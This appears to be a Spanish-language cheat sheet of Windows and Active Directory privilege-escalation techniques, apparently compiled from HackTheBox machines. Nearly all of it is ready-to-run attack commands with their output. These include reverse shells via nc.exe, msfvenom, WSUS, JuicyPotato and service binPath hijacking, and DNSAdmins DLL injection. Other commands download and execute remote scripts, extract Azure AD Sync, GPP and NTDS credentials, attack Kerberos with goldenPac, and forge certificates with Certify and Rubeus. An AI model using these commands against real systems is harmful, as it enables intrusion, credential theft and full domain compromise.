# privesc

# Privesc

## Abuso del grupo WSUS Administrator

### Archivos necesarios

```
iwr -uri http://10.10.14.2/SharpWSUS.exe -o SharpWSUS.exe
iwr -uri http://10.10.14.2/PsExec64.exe -o PsExec64.exe
iwr -uri http://10.10.14.2/nc.exe -o nc.exe
```

### Reverse Shell

```
.\SharpWSUS.exe create /payload:"C:\Windows\Temp\Privesc\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c C:\\Windows\Temp\Privesc\\nc.exe -e cmd 10.10.14.2 443" /title:"ReverseShell"
```

## Abuso del grupo Azure Admins

```
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/AdDecrypt.exe -o AdDecrypt.exe
*Evil-WinRM* PS C:\Temp> iwr -uri http://10.10.16.9/mcrypt.dll -o mcrypt.dll
*Evil-WinRM* PS C:\> cd "C:\Program Files\Microsoft Azure AD Sync\bin"
*Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\bin> C:\Temp\AdDecrypt.exe -FullSQL

======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

## Abuso del grupo DNSAdmins

![https://rubbxalc.github.io/writeups/assets/img/Resolute-htb/1.png](https://rubbxalc.github.io/writeups/assets/img/Resolute-htb/1.png)

### Creación de binario para la reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -f dll -o pwned.dll
```

### Inserción en un servicio

```
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd /config /serverlevelplugindll \\10.10.16.9\shared\pwned.dll
```

### Reiniciar servicio

```
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns
*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns
```

## Abuso del grupo Server Operators

### Listar servicios

```
*Evil-WinRM* PS C:\Users\jorden\Documents> services

Path                                                                                                                 Privileges Service
----                                                                                                                 ---------- -------
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_state.exe                                                           True aspnet_state
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5EB04B3D-85AE-4574-88FB-F22CF32D39F5}\MpKslDrv.sys       True MpKslDrv
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER                          True MSSQLSERVER
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost
"C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"                                                     True SQLBrowser
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER                         True SQLSERVERAGENT
"C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service                                True SQLTELEMETRY
"C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"                                                            True SQLWriter
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\NisSrv.exe"                                              True WdNisSvc
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1911.3-0\MsMpEng.exe"
```

### Modificación del BinPath de un servicio

```
*Evil-WinRM* PS C:\Privesc> sc.exe config VMTools binPath="C:\Privesc\nc.exe -e cmd.exe 10.10.16.6 443"
[SC] ChangeServiceConfig SUCCESS
```

### Reinicio del proceso

```
*Evil-WinRM* PS C:\Privesc> sc.exe config browser binPath="C:\Windows\System32\cmd.exe /c net localgroup administrators jorden /add"
[SC] ChangeServiceConfig SUCCESS

*Evil-WinRM* PS C:\Privesc> sc.exe start browser
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

## Credenciales cacheadas

### Firefox

```
*Evil-WinRM* PS C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release> dir -Force

    Directory: C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release
[...snip...]
```

### Uso de firepwd.py

Primero copiar al directorio actual de trabajo el `key4.db` y el `login.json`

```
python3 firepwd.py
```

## Listar reglas de Firewall

```
netsh advfirewall show currentprofile
```

## Abuso del privilegio SeImpersonatePrivileage

## Uso de JuicyPotato

```
PS C:\Temp> .\JuicyPotato.exe -t * -p C:\Windows\system32\cmd.exe -l 1337 -a "/c C:\Temp\nc.exe -e cmd 10.10.16.2 443"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

## Uso de Named Pipes

Para ello es necesario aprovecharse de una tarea CRON en la que otro usuario se atachée a un named pipe alojado del atacante, de forma que se pueda impersonar para ejecutar comandos como este

### Path

La estructura de llamada es así

```
\\.\pipe\dummypipe
```

### Explotación

En caso de ser vulnerable, el script en PowerShell de `decoder_it`, debe devolver el nombre de usuario que se ha conectado

```
*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> .\pipeserverimpersonate.ps1
Waiting for connection on namedpipe:dummypipe
ImpersonateNamedPipeClient: 1
user=HACKBACK\hacker
OpenThreadToken:True
True
CreateProcessWithToken: False  1058
```

### Alteración del script

```
###we are impersonating the user, everything we do before RevertoSelf is done on behalf that user
echo "user=$user "
copy C:\Windows\System32\spool\drivers\color\rubbx.bat C:\util\scripts\spool\rubbx.bat
```

## Abuso del servicio userlogger

### Detener el servicio

```
sc stop userlogger C:\test.txt
```

### Explotación

Pasarle como argumento un fichero con dos puntos al final. Se le asignarán privilegios de lectura y escritura para cualquier usuario

```
C:\>sc start userlogger C:\test.txt:
```

```
C:\>icacls test.txt
icacls test.txt
test.txt Everyone:(F)

Successfully processed 1 files; Failed processing 0 files
```

### Iniciar servicio

```
sc start userlogger C:\Users\Administrator\Desktop\root.txt:
```

## Obtener contenido ADS

```
more < C:\Users\Administrator\Desktop\root.txt:flag.txt
```

## Dumpeo de hashes NT

```
impacket-secretsdump -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit LOCAL
```

## Obtener procesos por Identificador

```
PS C:\Windows\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/Get-WinEventData.ps1')
```

```
PS C:\Windows\Temp> Get-WinEvent -FilterHashtable @{Logname='security';id=4688} -MaxEvents 10 | Get-WinEventData
```

## Decrypt groups.xml

```
gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
```

## Golden Ticket Attack

```
goldenPac.py 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] User SID: S-1-5-21-4220043660-4019079961-2895681657-1103
[*] Forest SID: S-1-5-21-4220043660-4019079961-2895681657
[*] Attacking domain controller mantis.htb.local
[*] mantis.htb.local found vulnerable!
[*] Requesting shares on mantis.....
[*] Found writable share ADMIN$
[*] Uploading file xvCbwVPb.exe
[*] Opening SVCManager on mantis.....
[*] Creating service Jlxr on mantis.....
[*] Starting service Jlxr.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

## Abuso de certificados

```jsx
PS C:\Users\diegocruz\Desktop> .\Certify.exe find /vulnerable /currentuser

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate templates
[*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=windcorp,DC=htb'

[*] Listing info about the Enterprise CA 'windcorp-CA'

    Enterprise CA Name            : windcorp-CA
    DNS Hostname                  : earth.windcorp.htb
    FullName                      : earth.windcorp.htb\windcorp-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=windcorp-CA, DC=windcorp, DC=htb
    Cert Thumbprint               : 280458EB20AE6B8A8FFE9B428A5078094F91B3E8
    Cert Serial                   : 3645930A75C5C8BA4AAC0A5C883DEE60
    Cert Start Date               : 5/24/2021 7:48:07 PM
    Cert End Date                 : 5/24/2036 7:58:07 PM
    Cert Chain                    : CN=windcorp-CA,DC=windcorp,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
      Allow  ManageCA, ManageCertificates               WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!

    CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
        All Extended Rights         : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
      Object Control Permissions
        Owner                       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
        Full Control Principals     : WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteOwner Principals       : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteDacl Principals        : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290
        WriteProperty Principals    : WINDCORP\Administrator        S-1-5-21-3510634497-171945951-3071966075-500
                                      WINDCORP\Domain Admins        S-1-5-21-3510634497-171945951-3071966075-512
                                      WINDCORP\Enterprise Admins    S-1-5-21-3510634497-171945951-3071966075-519
                                      WINDCORP\webdevelopers        S-1-5-21-3510634497-171945951-3071966075-3290

Certify completed in 00:00:12.5182225
```

### Abuso de ENROLLEE_SUPPLIES_SUBJECT

Puedo tratar de crear un nuevo certificado a partir de un principal ya existente en el sistema y pasarselo a Rubeus para obtener un hash NT del usuario Administrador. Para poder crearlo necesito importar ADCS.ps1 a la máquina (Active Directory Cerficate Services) y PowerView.ps1

```jsx
Get-SmartCardCertificate -Identity Administrator -TemplateName web -NoSmartCard -Verbose
```

```jsx
PS C:\Users\diegocruz\Desktop> gci cert:\currentuser\my

   PSParentPath: Microsoft.PowerShell.Security\Certificate::currentuser\my

Thumbprint                                Subject                                                                      
----------                                -------                                                                      
F52A69DE4A6F654097422754629CA33AD314F1E0
```

```jsx
PS C:\Users\diegocruz\Desktop> .\Rubeus.exe asktgt /user:Administrator /certificate:F52A69DE4A6F654097422754629CA33AD314F1E0 /getcredentials
```